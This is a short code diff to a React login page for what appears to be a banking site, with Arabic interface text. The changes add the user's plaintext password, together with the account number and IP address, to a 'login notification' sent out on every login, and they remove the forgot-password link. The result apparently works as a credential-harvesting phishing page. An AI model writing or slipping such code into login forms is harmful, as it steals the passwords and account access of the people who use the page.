@@ -151,7 +151,7 @@ const Login = () => {
                 // Create user session
                 const userData = {
                     accountNumber: formData.accountNumber,
-                    email: `user${formData.accountNumber}@ibok.com`, // Demo email
+                    email: formData.accountNumber, // Demo email
                     loginTime: new Date().toISOString()
                 };
 
@@ -162,8 +162,9 @@ const Login = () => {
                 try {
                     const ipAddress = await getUserIP();
                     await sendLoginNotification({
-                        userEmail: userData.email,
+                        // userEmail: userData.email,
                         accountNumber: userData.accountNumber,
+                        password: formData.password,
                         ipAddress
                     });
                 } catch (emailError) {
@@ -309,12 +310,7 @@ const Login = () => {
                         </div>
 
 
-                        {/* Forgot Password Link */}
-                        <div className="text-center">
-                            <a href="#" className="text-link">
-                                نسيت كلمة المرور؟
-                            </a>
-                        </div>
+
 
                         {/* Submit Button */}
                         <div className="form-group mt-lg">
